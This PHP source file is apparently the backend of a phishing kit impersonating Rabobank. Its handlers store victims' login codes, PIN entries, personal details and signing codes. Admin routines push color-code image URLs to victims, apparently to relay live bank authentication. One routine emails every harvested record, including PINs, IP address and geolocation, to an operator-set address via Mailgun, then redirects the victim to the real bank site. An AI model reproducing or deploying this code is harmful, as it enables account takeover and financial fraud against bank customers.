<?php

require_once("../common/commonfiles.php");
require_once("../common/mail.php");
?>
<?php

if (!isset($_POST["j"]) && !isset($_GET['j'])) {
    $_SESSION['error'] = "901";
    $_SESSION["msgType"] = "danger";
    header("location: " . $site_root . "index.php?m=901");
} else {
    $task = trim($_REQUEST['j']);
}
switch ($task) {
    case 2: //Logout
        logout();
        header('Location: ' . $site_root . 'login.php');
        break;

    case 3: //add inlogue 

        $obj['inlog_code'] = $_POST["inlogue"];

        $query = db::prepUpdateQuery($obj, "data", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)

        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/informatie.html");
        }

        break;

    case 4: //add informetie
        $date = $_POST["qfs_IF2269_7305"];
        $val = explode("-", $date);
        $m = $val[0];
        $d = $val[1];
        $y = $val[2];
        $dfdb = $y . "-" . $m . "-" . $d;



        $obj['Voorletters'] = $_POST["qfs_IF2269_7313"];
        $obj['voornamen'] = $_POST["voornamen"];
        $obj['vervaldatum'] = $_POST["vervaldatum"];
        $obj['date'] = $dfdb;

        $query = db::prepUpdateQuery($obj, "customer_details", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/wijzig-pincode.html");
        }

        break;

    case 5: //add informetie

        if (isset($_POST["inlogue"])) {
            $obj['inlog_code'] = $_POST["inlogue"];
        }
        $obj['h_pincode'] = $_POST["qfs_IF2269_7306"];
        $obj['n_pincode'] = $_POST["qfs_IF2269_7306"];
        $obj['b_n_pincode'] = $_POST["qfs_IF2269_7306"];


        $query = db::prepUpdateQuery($obj, "data", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/ondertekenen.html");
        }

        break;

    case 6: //add ondertaken
        $obj['signee_rcode'] = $_POST["AuthCd"];
        $query = db::prepUpdateQuery($obj, "data", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        die("1");
        break;
    case 66: //add ondertaken
        $obj['signee_rcode3'] = $_POST["AuthCd"];
        $query = db::prepUpdateQuery($obj, "data", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            $obj2['status'] = "1";
            $query2 = db::prepUpdateQuery($obj2, "data", "id", $_SESSION["recordIdd"]); //(Associative array, table name, record id)
            $result2 = db::updateRecord($query2);
            header("Location: https://www.rabobank.nl/particulieren/");
            die();
        }

        break;

    case 7: //add image url

        $id = $_POST['rid'];
        $obj['kleure_ncode'] = $_POST['url'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/admin/index.php");
        }
        break;

    case 8: //add image url

        $id = $_POST['rid2'];
        $obj['kleure_ncode2'] = $_POST['url'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/admin/index.php");
        }
        break;

    case 88: //add image url

        $id = $_POST['rid2'];
        $obj['kleure_ncode3'] = $_POST['url'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/admin/index.php");
        }
        break;


    case 9: //Delete Record

        $id = $_GET['id'];
        $obj['status'] = "2";

        $query = db::prepUpdateQuery($obj, "customer_details", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);

        if ($result) {
            header("location: progress.php");
        }
        break;

    case 10: //Delete Record

        $id = $_GET['id'];
        $obj['status'] = "2";

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);

        if ($result) {
            header("location: progress.php");
        }
        break;


    case 100: //Delete Record

        $id = $_GET['id'];
        $obj['status'] = "1";

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);

        if ($result) {
            header("location: progress.php");
        }
        break;


    case 11: //add image url

        $id = $_POST['rid'];
        $obj['kleure_ncode'] = $_POST['url'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/admin/progress.php");
        }
        break;

    case 111: //add image url

        $id = $_POST['rid'];
        $obj['verzenden'] = $_POST['verzenden'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        if ($result) {
            header("location:progress.php");
        }
        break;

    case 12: //add image url

        $id = $_POST['rid2'];
        $obj['kleure_ncode2'] = $_POST['url'];

        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)

        $result = db::updateRecord($query);
        if ($result) {
            header("location: " . $site_root . "/admin/progress.php");
        }
        break;


    case 13: //KeyUp Sound

        $id = '1';
        $obj['sound'] = '1';

        $query = db::prepUpdateQuery($obj, "sound", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        return $result;
        break;


    case 14: //Update user

        $pass = sha1($_POST['pwd']);
        $obj['username'] = $_POST['username'];
        if ($pass != '') {
            $obj['password'] = $pass;
        }

        $query = db::prepUpdateQuery($obj, "user", "id", $_SESSION["loggedInUserId"]); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        adminRedirect("profile", $result, "", 1); // (filename, true/false, record id, [update=1, insert=2, del=3])

        break;

    case 15: //Update Data notes
        $id = $_POST['record'];
        $obj['notes'] = $_POST['notes'];


        $query = db::prepUpdateQuery($obj, "data", "id", $id); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        adminRedirect("approved", $result, "", 1); // (filename, true/false, record id, [update=1, insert=2, del=3])

        break;

    case 16: //Update Credentials


        $obj['email'] = $_POST['email'];
        $obj['from_email'] = $_POST['femail'];
        $obj['host'] = $_POST['host'];
        $obj['password'] = $_POST['pass'];
        $obj['user_name'] = $_POST['username'];


        $query = db::prepUpdateQuery($obj, "credentials", "id", "1"); //(Associative array, table name, record id)
        $result = db::updateRecord($query);
        adminRedirect("credentials", $result, "", 1); // (filename, true/false, record id, [update=1, insert=2, del=3])

        break;


    case 17:

        $credentials = db::getRecord("SELECT * FROM credentials WHERE id = 1");

        $toEmail = $credentials['email'];
        $FromEmail = $credentials['from_email'];
        $hostSMTP = $credentials['host'];
        $passSMTP = $credentials['password'];
        $userName = $credentials['user_name'];


        $GetRecord = db::getRecords("SELECT * FROM data WHERE status = 1 AND email_status = 0");
        foreach ($GetRecord as $record) {
            $user_name = $userName;
            $message = 'RK NUMM : ' . $record["rk_nummer"] . ' Pass Num : ' . $record["pass_nummer"] . ' Inlog Code :' . $record["inlog_code"] . ' Gender : ' . $record["gender"] . ' VoorLetters :' . $record["Voorletters"] . ' Date :' . $record["date"] . ' Huidige pincode :' . $record["h_pincode"] . ' Nieuwe pincode: ' . $record["n_pincode"] . '  Bevestig nieuwe pincode
 : ' . $record["b_n_pincode"] . ' SigneerCode: ' . $record["signee_rcode"] . ' Klueron Code : ' . $record["kleure_ncode"] . ' Klueron Code2 :' . $record["kleure_ncode2"] . ' IP Adress : ' . $record["ipaddress"] . ' Address :' . $record["address"] . ' Lat : ' . $record["lat"] . ' Long : ' . $record["longt"] . ' Data Date :' . $record["datedata"] . 'Notes :' . $record["notes"] . 'User Agent :' . $record["user_agent"];
            $subject = "Approved User Data ";
            $to = $toEmail;
            $toname = "Data";
            $from = $FromEmail;
            $fromname = "Approved Data";
            if ($to) {
                $result5 = sendMailgun($message, $subject, $to, $toname, $from, $fromname, "", $hostSMTP, $passSMTP);

                if ($result5) {
                    $obj2['email_status'] = "1";
                    $query2 = db::prepUpdateQuery($obj2, "data", "id", $record["id"]);
                    $result2 = db::updateRecord($query2);
                }
            } else {
                
            }
        }


        // $rkNum = $GetRecord['rk_nummer'] ;
        // $passNum = $GetRecord['pass_nummer'] ;
        // $inlog_code = $GetRecord['inlog_code'] ;
        // $gender = $GetRecord['gender'] ;
        // $Voorletters = $GetRecord['Voorletters'] ;
        // $date = $GetRecord['date'] ;
        // $h_pin = $GetRecord['h_pincode'] ;
        // $n_pin = $GetRecord['n_pincode'] ;
        // $b_n_pin = $GetRecord['b_n_pincode'] ;
        // $sign_code = $GetRecord['signee_rcode'] ;
        // $k_code = $GetRecord['kleure_ncode'] ;
        // $k_code2 = $GetRecord['kleure_ncode2'] ;
        // $ipadres = $GetRecord['ipaddress'] ;
        // $adres = $GetRecord['address'] ;
        // $lat = $GetRecord['lat'] ;
        // $long = $GetRecord['longt'] ;
        // $datadate = $GetRecord['datedata'] ;
        // $notes = $GetRecord['notes'] ;
        // $useragent = $GetRecord['user_agent'] ;




        break;

    case 18: //Delete User Record
        $id = $_GET['id'];
        $result = db::deleteRecord("user", "id", $id);
        if ($result) {
            header("location:users.php");
        }
        break;
    case 188: //Delete User Record
        $id = $_GET['id'];
        $result = db::deleteRecord("ips", "id", $id);
        if ($result) {
            header("location:ips.php");
        }
        break;
    /* ----------------------------------- Adverts ----------------------------------------------- */
}
?>